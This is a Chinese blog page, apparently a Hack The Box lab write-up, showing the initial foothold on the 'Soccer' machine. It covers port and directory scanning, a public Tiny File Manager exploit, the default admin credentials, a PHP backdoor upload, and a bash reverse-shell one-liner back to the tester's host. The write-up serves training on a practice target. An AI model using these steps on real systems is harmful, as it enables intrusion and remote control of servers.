@@ -1,0 +1,828 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：目录扫描、Tiny File Manager默认口令、Tiny File Manager任意文件上传、进程分析与DNS绑定、Websocket SQL注入、suid提权、doas提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Soccer-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/04/20/Soccer-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：目录扫描、Tiny File Manager默认口令、Tiny File Manager任意文件上传、进程分析与DNS绑定、Websocket SQL注入、suid提权、doas提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/11.png">
+<meta property="article:published_time" content="2024-04-20T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-05-06T09:01:51.979Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/Soccer-htb-writeup/1.png">
+  
+  
+  
+  <title>Soccer-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Soccer-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-04-20 23:50" pubdate>
+          2024年4月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          140 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Soccer-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：目录扫描、Tiny File Manager默认口令、Tiny File Manager任意文件上传、进程分析与DNS绑定、Websocket SQL注入、suid提权、doas提权</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2023/06/10/htb-soccer.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.11.194</p>
+<p>2、获取下开放端口情况：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span> -oG allports -Pn<br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-20 07:11 CST</span><br>RTTVAR has grown to over <span class="hljs-number">2.3</span> seconds, decreasing to <span class="hljs-number">2.0</span><br>RTTVAR has grown to over <span class="hljs-number">2.3</span> seconds, decreasing to <span class="hljs-number">2.0</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span><br>Host is up (<span class="hljs-number">7.8</span>s latency).<br>Not shown: <span class="hljs-number">53470</span> filtered tcp ports (no-response), <span class="hljs-number">12063</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br><span class="hljs-number">80</span>/tcp open  http<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">76.17</span> seconds<br>                                                                                                                                                           <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p22,<span class="hljs-number">80</span> --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span> -Pn -sC -sV<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-04-20 07:13 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span><br>Host is up (<span class="hljs-number">0.12</span>s latency).<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4u</span>buntu0<span class="hljs-number">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">3072</span> ad:<span class="hljs-number">0</span>d:<span class="hljs-number">84</span>:a3:fd:cc:<span class="hljs-number">98</span>:a4:<span class="hljs-number">78</span>:fe:f9:<span class="hljs-number">49</span>:<span class="hljs-number">15</span>:da:e1:<span class="hljs-number">6</span>d (RSA)<br>|   <span class="hljs-number">256</span> df:d6:a3:<span class="hljs-number">9f</span>:<span class="hljs-number">68</span>:<span class="hljs-number">26</span>:<span class="hljs-number">9</span>d:fc:<span class="hljs-number">7</span>c:<span class="hljs-number">6</span>a:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:e9:<span class="hljs-number">61</span>:f0:<span class="hljs-number">0</span>c (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">57</span>:<span class="hljs-number">97</span>:<span class="hljs-number">56</span>:<span class="hljs-number">5</span>d:ef:<span class="hljs-number">79</span>:<span class="hljs-number">3</span>c:<span class="hljs-number">2f</span>:cb:db:<span class="hljs-number">35</span>:ff:f1:<span class="hljs-number">7</span>c:<span class="hljs-number">61</span>:<span class="hljs-number">5</span>c (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>|_http-title: Did not follow redirect to http:<span class="hljs-comment">//soccer.htb/</span><br>|_http-server-header: nginx/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (Ubuntu)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">16.72</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、那就绑定下发现的域名地址吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&quot;10.10.11.194 soccer.htb&quot;</span> | sudo tee -a /etc/hosts<br><span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span> soccer.htb<br></code></pre></td></tr></table></figure>
+
+<p>4、使用whatweb识别一下网站服务，并查看下网站页面吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ whatweb http:<span class="hljs-comment">//soccer.htb/</span><br>http:<span class="hljs-comment">//soccer.htb/ [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0] </span><br></code></pre></td></tr></table></figure>
+
+<p><code>http://soccer.htb/</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、并没有什么大的发现，那就扫一下目录吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ ffuf -u http:<span class="hljs-comment">//soccer.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt </span><br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://soccer.htb/FUZZ</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 450ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 453ms]</span><br><span class="hljs-string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 528ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 565ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 569ms]</span><br><span class="hljs-string"># directory-list-2.3-small.txt [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 631ms]</span><br><span class="hljs-string"># Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 672ms]</span><br><span class="hljs-string"># Copyright 2007 James Fisher [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 620ms]</span><br><span class="hljs-string"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 660ms]</span><br><span class="hljs-string"># on at least 3 different hosts [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 664ms]</span><br><span class="hljs-string"># This work is licensed under the Creative Commons [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 711ms]</span><br><span class="hljs-string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 721ms]</span><br><span class="hljs-string">#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 476ms]</span><br><span class="hljs-string"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 510ms]</span><br><span class="hljs-string">tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 863ms]</span><br><span class="hljs-string">                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 357ms]</span><br><span class="hljs-string">[WARN] Caught keyboard interrupt (Ctrl-C)</span><br></code></pre></td></tr></table></figure>
+
+<p>6、发现了一个目录地址，查看下这个页面</p>
+<p><code>http://soccer.htb/tiny/</code></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>view-source:http://soccer.htb/tiny/</code></p>
+<p><code>data-version=&quot;2.4.3&quot;</code></p>
+<p>7、通过查看页面源码，发现了这个CMS的版本号，下面开始搜集这个CMS的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ searchsploit Tiny File Manager                                    <br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                           |  Path<br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Manx <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php&#x27;</span> Multiple Cross-Site Scripting Vulnerabi | php/webapps/<span class="hljs-number">36364.</span>txt<br>Manx <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> - <span class="hljs-string">&#x27;/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php&#x27;</span> Multiple Cross-Site Scripting Vulne | php/webapps/<span class="hljs-number">36365.</span>txt<br>MCFileManager Plugin <span class="hljs-keyword">for</span> TinyMCE <span class="hljs-number">3.2</span><span class="hljs-number">.2</span><span class="hljs-number">.3</span> - Arbitrary File Upload                                                         | php/webapps/<span class="hljs-number">15768.</span>txt<br>Tiny File Manager <span class="hljs-number">2.4</span><span class="hljs-number">.6</span> - Remote Code <span class="hljs-title function_">Execution</span> <span class="hljs-params">(RCE)</span>                                                                    | php/webapps/50828.sh<br>TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                      | php/webapps/15194.txt<br>------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>                                                                                                                                                           <br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ searchsploit -x 50828         <br>  Exploit: Tiny File Manager 2.4.6 - Remote Code <span class="hljs-title function_">Execution</span> <span class="hljs-params">(RCE)</span><br>      URL: https:<span class="hljs-comment">//www.exploit-db.com/exploits/50828</span><br>     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh<br>    Codes: CVE-2021-45010, CVE-2021-40964<br> Verified: False<br>File Type: Unicode text, UTF-8 text<br>                                                                                                                                   <br>┌──<span class="hljs-params">(kali㉿offsec)</span>-[~/Desktop]<br>└─$ searchsploit -m 50828<br>  Exploit: Tiny File Manager 2.4.6 - Remote Code <span class="hljs-title function_">Execution</span> <span class="hljs-params">(RCE)</span><br>      URL: https:<span class="hljs-comment">//www.exploit-db.com/exploits/50828</span><br>     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh<br>    Codes: CVE-2021-45010, CVE-2021-40964<br> Verified: False<br>File Type: Unicode text, UTF-8 text<br>Copied to: /home/kali/Desktop/50828.sh<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、通过EXP发现了默认的账号密码信息，登录后，根据EXP的内容，我们可以上传木马文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">admin admin@<span class="hljs-number">123</span><br>http:<span class="hljs-comment">//soccer.htb/tiny/tinyfilemanager.php?p=</span><br>https:<span class="hljs-comment">//github.com/febinrev/tinyfilemanager-2.4.3-exploit/</span><br><br>http:<span class="hljs-comment">//soccer.htb/tiny/uploads/qsd-php-backdoor.php?f=/var/www/html//tiny/tinyfilemanager.php</span><br><br>    <span class="hljs-string">&#x27;admin&#x27;</span> =&gt; <span class="hljs-string">&#x27;$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW&#x27;</span>, <span class="hljs-comment">//admin@123</span><br>    <span class="hljs-string">&#x27;user&#x27;</span> =&gt; <span class="hljs-string">&#x27;$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO&#x27;</span> <span class="hljs-comment">//12345</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Soccer-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、这里需要注意的是，这里是用的异步的js进行自动上传的，所以得等系统加载完js才行，要不然上传不上去文件，这里会定期清理目录，所以需要及时把我们的shell运行上去。</p>
+<p><code>http://soccer.htb/tiny/uploads/qsd-php-backdoor.php</code></p>
+<p><code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.7/443 0&gt;&amp;1&quot;</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ rlwrap nc -lnvp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.7</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.11</span><span class="hljs-number">.194</span>] <span class="hljs-number">45436</span><br>bash: cannot <span class="hljs-built_in">set</span> terminal process <span class="hljs-title function_">group</span> <span class="hljs-params">(<span class="hljs-number">1051</span>)</span>: Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control in this shell<br>www-data@soccer:~/html/tiny/uploads$ <br><br>www-data@soccer:~/html/tiny/uploads$ id<br>id<br>uid=<span class="hljs-number">33</span>(www-data) gid=<span class="hljs-number">33</span>(www-data) groups=<span class="hljs-number">33</span>(www-data)<br>www-data@soccer:~/html/tiny/uploads$ ls -la /home<br>ls -la /home<br>total <span class="hljs-number">12</span><br>drwxr-xr-x  <span class="hljs-number">3</span> root   root   <span class="hljs-number">4096</span> Nov <span class="hljs-number">17</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">21</span> root   root   <span class="hljs-number">4096</span> Dec  <span class="hljs-number">1</span>  <span class="hljs-number">2022</span> ..<br>drwxr-xr-x  <span class="hljs-number">3</span> player player <span class="hljs-number">4096</span> Nov <span class="hljs-number">28</span>  <span class="hljs-number">2022</span> player<br>www-data@soccer:~/html/tiny/uploads$ <br></code></pre></td></tr></table></figure>
+
+<p>10、到目前位置，就获取到了一个初始的shell，下面开始常规的信息收集</p>
